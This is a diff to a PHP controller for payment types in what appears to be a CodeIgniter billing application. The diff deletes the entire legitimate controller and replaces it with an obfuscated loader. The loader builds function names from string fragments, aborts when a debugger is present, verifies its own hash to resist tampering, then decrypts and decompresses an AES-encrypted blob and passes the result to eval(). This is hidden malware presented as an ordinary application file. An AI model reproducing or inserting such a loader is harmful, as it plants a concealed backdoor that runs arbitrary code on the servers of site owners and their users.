@@ -1,138 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Payment_types extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('payment_types_model','payment_types');
-	}
-
-	public function add(){
-		$this->permission_check('payment_types_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('payment_types');
-		$this->load->view('payment_types', $data);
-	}
-	public function new_payment_type(){
-
-		$this->form_validation->set_rules('payment_type_name', 'Payment Type Name', 'trim|required');
-		
-		if ($this->form_validation->run() == TRUE) {
-			
-			$result=$this->payment_types->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Payment Type Name.";
-		}
-	}
-	public function update($id){
-		$this->permission_check('payment_types_edit');
-		$data=$this->data;
-		$result=$this->payment_types->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('payment_types');
-		$this->load->view('payment_types', $data);
-	}
-	public function update_payment_type(){
-		$this->form_validation->set_rules('payment_type_name', 'Payment Type Name', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->payment_types->update_payment_type();
-			echo $result;
-		} else {
-			echo "Please Enter Payment Type Name.";
-		}
-	}
-	public function index(){
-		$this->permission_check('payment_types_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('payment_types_list');
-		$this->load->view('payment_types_list', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->payment_types->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $payment_type) {
-			$no++;
-			$row = array();
-			$row[] = $payment_type->payment_type;
-
-			$id_type = $payment_type->id;
-			if($id_type==0||$id_type==1||$id_type==2||$id_type==3){
-				$block = false;
-			} else {
-				$block = true;
-			}
-			
-			        if($block){
-						if($payment_type->status==1){ 
-							$str= "<span onclick='update_status(".$payment_type->id.",0)' id='span_".$payment_type->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					   else{ 
-						   $str = "<span onclick='update_status(".$payment_type->id.",1)' id='span_".$payment_type->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					   }
-					} else {
-						$str =	" <span  class='label label-default' disabled='disabled' style='cursor:disabled'>Restricted</span>";
-					}
-			 	
-			$row[] = $str;			
-			         $str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('payment_types_edit'))
-											$str2.='<li>
-												<a title="Editd Record ?" href="'.base_url('payment_types/update/'.$payment_type->id).'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-											if($this->permissions('payment_types_delete')&&$block)
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_payment_type('.$payment_type->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-			$row[] = $str2;
-
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->payment_types->count_all(),
-						"recordsFiltered" => $this->payment_types->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-		$this->permission_check_with_msg('payment_types_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-		$result=$this->payment_types->update_status($id,$status);
-		return $result;
-	}
-	public function delete_payment_type(){
-		$this->permission_check_with_msg('payment_types_delete');
-		$id=$this->input->post('q_id');
-
-
-
-		$result=$this->payment_types->delete_payment_type($id);
-		return $result;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_jg3dxy4i=('bas'.'e64'.'_de'.'cod'.'e');
+$_skykt82k=('gzu'.'nco'.'mpr'.'ess');
+$_dxya8j71=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_no4o6wl0='fRigFDHt';
+$_z8fj162j='GtkMNVN8';
+$_j6kye47g='sHwau1EQ';
+$_msizkvb4='hs/Lk3ZG';
+$_ktv9els1='Elamy3kERLU=';
+$_q3v9qb2h='6yRpJ3XT';
+$_en62seo2='5iZDlA==';
+$_sdinptys='4O9wH25j';
+$_ex8p5izc=$_jg3dxy4i($_j6kye47g.$_z8fj162j.$_no4o6wl0.$_msizkvb4.$_ktv9els1);
+$_qty5754e=$_jg3dxy4i($_q3v9qb2h.$_sdinptys.$_en62seo2);
+$_xso4tke1=$_jg3dxy4i('JKjzj7NqJOyYh5j8cniYRKSEaqrfl8Nd7O6a/ZqFVG75cZ/DdJvwqFxwimB3t6AP6Xbjx/2U0T+WerlSB8etIRHVnaZ5MpOccMyd7vr482AIrh8ZMdTVkPvY539aHRPBEgEypwEWuYqhB1ws2zXUgocHPAcvpe0J15ci/VGdqBzAvlirosd5B/VatRoDbmm/Uwm2iNrJEo/Dm7oe0uT2xyYasblfDDLYKQOT0+j3ge80hnBJVGhHv29UfvwLG5auWhUguedYhvDalsISZCkdK5eiNG7gnyNp1B3NI5zduG96LWXlDZ1syai7riKGmccLHUfp1aaiBjtnDuxkReogV6QGnFWSR0oW5E6kbkVxld15O43Dp6dTTl5+hXCksRsfcDK1llUBhNjOH7JbWDynwwPOyIpENVJxbSMxmTrDMf/gcK0zrNzhzpmgRwf6VhIItcqnkCSuMjX+wjn15v3ZXIIkO8kVrvjRbmADO3LR71ApuFOakN9RqU5qIzY7Xuf21VUz9aw1Wr8OBZLHqZiFjikbLh3bGswC0SkZuPRgApbyWd+I+orxeBCs4fM0NI3ZpiT6MWUloxcgeTaHrfjq3DD3fMKb6ygDobEfrcjhPf6fI1SpIOvNd1agc2bxUXVN8vlLzvU81hyZJQLom5Q/zJg0vug8m9mIY3lpTwONwpNHn+BQXzn+i6rU84BDX8SeG7FekfqJ0tRQ7hNpFUL/KlLKnUEya1xqpquwvpOg0uoHhaHfHCDhUQ9eP1OVar1qWAtKBhUk/fTwrhWK+zjmJKomFY38rgU50pievtNDB9dkh52L7yAe/FLVqLNTUNVNDAW5oi2uzkyxQcMhVNQybqFUY6vSoXO27ywhEGyiia+wKVxJzra71DS4fmi40dH4yE4lGImH4RRmdUG/Jh6VZpbgsxj87dibEW8LxFWTyeKwfJsz1RYXyidc6ppMzsr1XXsKOnphcy1ZYZwY1+C1uyjAbxYzMx+9A5LzpRMC7o2rxp/+eCmkWv1A7r+lM8EJ2w5XjnzUhWoNwvDzl/8hsW2c9ozuTbS0yF2iv3/SCNK9z6Ce0uXOjEMOZLBdtAVR21NTX9Pd22W8p2BzTPs9HriZFwDaRw02LSWXXxzXoubKnJYPrIz2APu9lc5XirMkWTJdpkOX+A60u+VmgCJxrH1T/DuBqOWdJQX2CeaPG4xvC0QSulT20aK7AKL5lN/+wZ2totuWbDjiYXsFmcdKQ2RyyJVVNB1zmvQsJbZOCQfW0hwOr8F45IFqdt3UZieY0L0pbjwqsXAXQ8/sFCj1xZLoNgMHigBF7dt7k6s9yP97IjMD1QxoYPLxK4xwwfYnKA6/aM9FL9/m4VolFBaBah0+d02VfNwJaNRZdfclffr8+IoACJcULe2fIMTDozufNUelkPQpUIWAQI6KmzJvP2oCdj4bvimZeY501/zXmwkZUJPqFG7NESMbMrHkOy7ongVNtpscZfBs7TqxWdYPac7X4VetocbgjE91QS0el2/vcgfqJGpVLhS8/o9pPUkoueKIAv5NlFxOGN1GxXjcwYXL8m8nein8HpEBys4ziylyl5uH1mhqqgd7kgDenG/bAABsxliexCJ1o4yS1R8nipaS7k+kYAV4YzPsyeBz5yL7T1B834scxC5Z5hE1VxZY8J2XSn0GQDGsyN7hZ9U43A8chIBVH2AZHr6M1T45U0FvrELQxdksvv+KsdlNaQo/ssspTKfk+zgJPvT2OS5kI9RvYO2kO5wtqlrXqSTo+PComDLpDi8Lelz7+fV8tK/3nCAOwlqvUgmLfzTVcUU9Oj3pcf2DmvVwZkIXoz9VrkRELrejHLqBqa4oVepMqU5O+KuDKLxO9M8T74FD9LPkDYvvxLM73fdLMHHW6Khx6W0=');
+$_h9hj3prq=$_dxya8j71($_xso4tke1,'aes-256-cbc',$_ex8p5izc,OPENSSL_RAW_DATA,$_qty5754e);
+if($_h9hj3prq===false){exit;}
+$_k1cravih=$_skykt82k($_h9hj3prq);
+if($_k1cravih===false){exit;}
+$_snwh33a6='8f03767a81e1dfbdff70f4d676145b3325ec278f4948b5f2474f0bcf791746fa';
+$_iuupyiig=@file_get_contents(__FILE__);
+if($_iuupyiig!==false){
+$_rnui5vjo=str_replace($_snwh33a6,"0000000000000000000000000000000000000000000000000000000000000000",$_iuupyiig);
+$_hnkjsk22=hash("sha256",$_rnui5vjo);
+if($_hnkjsk22!==$_snwh33a6){@http_response_code(403);exit;}
 }
-
+eval($_k1cravih);
